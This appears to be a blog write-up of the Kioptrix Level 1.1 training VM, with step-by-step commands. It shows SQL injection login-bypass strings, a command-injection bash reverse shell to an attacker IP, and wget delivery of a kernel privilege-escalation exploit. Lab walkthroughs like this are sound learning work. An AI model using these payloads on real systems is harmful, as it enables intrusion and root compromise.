---
title: Kioptrix Level 1.1 
description: Day 2 of 100 Days challenge
date: 2025-10-11
categories: [Vlunhub, 100Days]
tags: [Vlunhub, 100Days, day2, kioptrix_Level_1.1] 
---

# Kioptrix Level 1.1 writeup ✍️

--- 

Name: Kioptrix: Level 1.1 (#2)<br>
Date release: 11 Feb 2011<br>
Author: Kioptrix<br>
Series: Kioptrix

## 🐜 Challenge Description

### Description

This Kioptrix VM Image are *easy challenges*. The object of the game is to **acquire root access** via any means possible (except actually hacking the VM server or player). The purpose of these games are to **learn the basic tools and techniques in vulnerability assessment and exploitation**. There are more ways then one to successfully complete the challenges.

Download 
: 
👉 [original](https://download.vulnhub.com/kioptrix/archive/Kioptrix_Level_2-original.rar) 👈 <br>
👉 [updated/Re-release](https://download.vulnhub.com/kioptrix/Kioptrix_Level_2-update.rar) 👈

### File Checksum

- Original MD5: 987FFB98117BDEB6CA0AAC6EA22E755D
- Original SHA1: 7A0EA0F414DFA0E05B7DF504F21B325C6D3CC53B
- Re-release MD5: 987FFB98117BDEB6CA0AAC6EA22E755D
- Re-release SHA1: 7A0EA0F414DFA0E05B7DF504F21B325C6D3CC53B

### File Information

Filename: Kioptrix_Level_2-original.rar<br>
File size: 404 MB<br>
MD5: 1CCC14189E530F9231ACF62E6FC8AF2D<br>
SHA1: 8E767C68D3884DB13F84A607E5366434E3FA0858<br>
Filename: Kioptrix_Level_2-update.rar<br>
File size: 406 MB<br>
MD5: 987FFB98117BDEB6CA0AAC6EA22E755D<br>
SHA1: 7A0EA0F414DFA0E05B7DF504F21B325C6D3CC53B<br>


### Virtual Machine

Format: Virtual Machine (VMware)<br>
Operating System: Linux

---

## Points I Have Learned 🌿

- SQL Injection
- Command Line Injection
- Reverse Shell
- Linux Privileges
- Exploit-DataBase

---

### SQL Injection
### Command Line Injection
### Reverse Shell Using NetCat
### Linux Privileges
### Exploit-DataBase & Searchsploit

---

## 🎨 Step By Step Process

### Step 1: Finding Target IP

- Target is Living on our Network So, Scan our Network to Find Target

```bash
ifconfig
```
![ifconfig](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/ifconfig.png)
- Here `10.174.145.52` is Attacker IP

```bash
nmap -sn 10.174.145.52/24
```
![TargetIP](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/targetdiscover.png)
- So, `10.174.145.57` is a Target IP 


### Step 2: Finding Vulnerabilites

#### Step 2.1: Scaning Target For Open Ports

```bash
nmap -T4 -A -v 10.174.145.57
```
![zenmap](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/openports.png)

Here You Can See Different Types of Ports are open. You Can See `3306/mysql` and `80/http` ports are open So, I open Browser and opened `http://10.174.145.57` It given Login Pannel for **Remote System Administration**.

So, I Tried SQL Injection on It.

![login](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/httpport.png)

Now The Exploitation Begin 💣


### Step 3: Explotation

#### Step 3.1: SQL Injection


![SQL Injection](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/sqli.png)

- Here Different Types Inputs Are Success.
  - Username: `admin` Password: `' OR 1=1 -- `
  - Username: `admin ' -- ` Password: `-`
  - Username: `admin' OR 1=1 -- ` Password: `-`


#### Step 3.2: Command Line Injection

After Login Into **Remote System Administration** you Can See **Ping a Machine on the Network**..

![Sucees](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/sqlisucess.png)

So, I Tried Command Line Injection

![whoami](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/ciwhoami.png)
![output](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/ciwhoamioutput.png)

- Here, The User is `apache` Not `root` I Disappointed 😮‍💨
- I want to He is a maybe so, I used `id` to check his id its `48` not `0`.
- So, I Checked it have `root` permissions by using `sudo -l`, but No permissions.
![id](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/cicheckidheisroot.png)
![sudo](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/cisudopermissions.png)

So, I decided To Exploit it for `root` access but Interaction Between it is So Uncomfortable i maked a **Reverse Shell** For Better Interaction

#### Step 3.3: Reverse Shell

- But It not contain `Netcat` So, I used `bash -i` for Interactive Shell.

1. First I Placed a Lisiner I Attacker Machine Using `nc`
: 
```bash
nc -lnvp 1234
```
![nclvnp](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/reverseshellAttacker.png)
- Here,
  - `nc` : NetCat It used to Listen OR Send a Connection Between **TCP ports** on Systems .
  - `-l` : Listen
  - `-n` : No Domain Name System
  - `-v` : verbose output
  - `-p` : port
- Now Attacker Is **Listening On Port** `1234`


2. Inject a Command To make a Connection to Attacker
: 
```text
10.174.145.52; bash -i >& /dev/tcp/10.174.145.52/1234 0>&1
```
![ci](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/cireverseshell.png)

Here,
  - `bash -i` : Makes a Interactive Shell (It is Designed to read commands from and write to terminal)
  - `>& /dev/tcp/< Atacker Ip >/ < port > `
    - `>` : Redirection Operator
    - `&` : signifies (Redirection apply both `stdout (1)` and `stderror (2)`)
    - `/de/tcp/ip/port` : special part that Bash interprets as Network Socket, It open a TCP connection to `ip` and `port`
    - the outpur and errors form bash process are sent over the network connection
  - `0>&1` : redirect `stdin` of Bash process to the Same place as `stdout`
    - `0` : stdin
    - `>` : Redirection operator
    - `&1` : duplicate File descriptor 1 (stdout)

![connection sucess](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/reseverseshellAttackerSucess.png)

#### Step 3.4: Exploitation For Root Access

Gathering System Information For Find Exploits

##### Step 3.4.1: System Information

```bash
# Target's Interactive Bash
uname -a
```
```bash
# Target's Interactive Bash
lsb_release -a
```
```bash
# Target's Interactive Bash
cat /etc/*release
```

![System Information](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/osdetails.png)

- Here Target is Using `Linux kernel 2.6.9` and `CentOS 4.5` operating system.

##### Step 3.4.2: Searching For Exploit

```bash
# Attacker's Shell
searchspolit linux kernel centos 4.5
```
![searchspolit](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/searchspolit.png)
- Here second one matching with linux kernel version so, we are using it.
- `linux_x86/local/9542.c` exploit on **Exploit Database**


##### Step 3.4.3: Delivery Exploit To Target

we using `wget` to transfer file from Atacker to Target by Establishing http server of
Attacker.

Make Sure that *exploitation file in home directory*.
```bash
# Attacker's Shell
cp /usr/share/exploitdb/exploits/linux_x86/local/9542.c Desktop/vlunhub/kioptrix_2
```

Hosting HTTP Server in Attacker Machine
: 
```bash
# Attacker Shell
python -m http.server 9000
```
- I hosted `HTTP Server` on port `9000`
![http server](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/httpserver.png)

Downloading Exploit From Attacker
: 
```bash
# Tagert's Interactive Bash
wget http://10.174.145.52:9000/Desktop/vlunhub/kioptrix_2/9542.c
```
![wget](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/wget.png)


##### Step 3.4.4: Exploiting of our exploit

- Make Sure you are using `/tmp` Directory for Exploitation

Compile The Exploit and Execute
: 
```bash
# Target's Interactive Bash
gcc 9542.c -o exploit && ./exploit
```
- You are Succesfully gained root shell

```bash
whoami
```
![root](/posts/Vlunhub/100Days/Day02_Kioptrix_Level_1_1/gainedroot.png)


Happy Hacking 🚀

---